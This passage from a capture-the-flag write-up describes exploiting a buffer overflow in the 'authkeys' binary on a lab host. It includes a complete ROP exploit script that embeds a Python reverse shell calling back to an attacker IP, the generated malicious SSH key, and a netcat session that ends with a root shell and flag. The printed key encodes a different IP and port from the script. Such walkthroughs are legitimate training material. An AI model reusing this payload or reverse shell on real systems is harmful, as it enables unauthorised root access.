- The inner loop moves through each character of an argument string until it encounters a null character, indicating the end of the string. It does this by incrementing the rbx register, which serves as an offset within the string. When the null character is found, the inner loop exits, and the program proceeds to the next argument string.

- The outer loop iterates through this process for each of the five argument strings passed to the program. By the end of the outer loop, the program effectively moves the pointer rsi + rbx to point to the start of the last argument string.


So basically a buffer overflwo vulnerability exists in the 4th arguement of the program


### Strategy

The plan to exploit the buffer overflow vulnerability in the authkeys binary running on AttendedGW involves several steps:

- Determine the offset required to overwrite the return address in the public key.

- Identify the system call (SYSCALL) that will be used to execute the payload.

- Find suitable gadgets within the binary to set the registers rax, rdi, rsi, and rdx for the payload.

- Map out the buffer layout to understand how the payload will be placed in memory.

- Develop a script to craft and inject the malicious SSH key into the authkeys binary.
- Regarding the development environment, Python scripting was done in a Parrot VM, while debugging and exploitation were performed via SSH into an OpenBSD VM. GDB was used for debugging, but due to the stripped binary, some commands like n and s didn't work, and alternatives like ni and si had to be used. Attempts to install Peda were unsuccessful, but some individuals managed to install GEF for debugging purposes.




< More explanation on the exploitaion of the binary, coming soon>

python sript for root:

```python
import base64
import struct

# Set constants
ip = '10.10.14.14'
port = 443
shell = f'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\0'.encode()
execve_args = [b'/usr/local/bin/python2\0', b'-c\0', shell]
base_addr = 0x6010c0

# Gadgets
rop_gadgets = [
    0x40036a, # pop_rdx
    0x40036d, # not_al
    0x400370, # shr_eax
    0x40037b, # movss_rdx
    0x400380, # cvtss2si_esi
    0x400367, # mov_rdi_rsi_pop_rdx
    0x4003cf  # syscall
]

# Helper function to generate ROP chain
def generate_rop_chain():
    rop_chain = b''
    for gadget in rop_gadgets:
        rop_chain += struct.pack('<Q', gadget)
    return rop_chain

# SSH header
ssh_header = b'ssh-rsa\0' + struct.pack('>I', 0x10001)

# Build payload
payload = ssh_header
for arg in execve_args:
    payload += arg
payload += b'\0' * (0x308 - len(payload))  # Padding to reach return address
payload += generate_rop_chain()           # Append ROP chain

# Encode payload
encoded_payload = base64.b64encode(payload.ljust(0x500, b'\0')).decode()

# Generate SSH key with payload
key = f'ssh-rsa {encoded_payload} 0xdf'

# Output key
with open('aaaa.pub', 'w') as f:
    f.write(key)
print(key)
```

```
$python script.py 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAE6gDML3Vzci9sb2NhbC9iaW4vcHl0aG9uMgAtYwBpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTYuMjIiLDkwMDEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOwDYEGAAAAAAAO8QYAAAAAAA8hBgAAAAAAAAAAAAAAAAALAhwEoAAAAAlCPASgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABtA0AAAAAAAHADQAAAAAAAcANAAAAAAABtA0AAAAAAAHADQAAAAAAAbQNAAAAAAABwA0AAAAAAAHADQAAAAAAAcANAAAAAAABtA0AAAAAAAHADQAAAAAAAcANAAAAAAABqA0AAAAAAAOoRYAAAAAAAewNAAAAAAACAA0AAAAAAAGcDQAAAAAAA8hFgAAAAAAB7A0AAAAAAAIADQAAAAAAAagNAAAAAAAAAAAAAAAAAAM8DQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA= non
```

Echo this key into a file on the machine and start a listener on the local machine

`attended$ ssh -i .non -p 2222 root@192.168.23.1`

```bash
$nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.22] from (UNKNOWN) [10.129.223.176] 26145
attendedgw# whoami
root

attendedgw# cd root
attendedgw# cat root.txt
1986e8537a05420f0d59263f04dcd48a

```



## References
- https://github.com/jetmore/swaks
- https://nvd.nist.gov/vuln/detail/CVE-2019-12735
- https://vim.fandom.com/wiki/Modeline_magic
- https://securityaffairs.co/wordpress/86934/hacking/cve-2019-12735-linux-flaw.html
- https://ippsec.rocks/
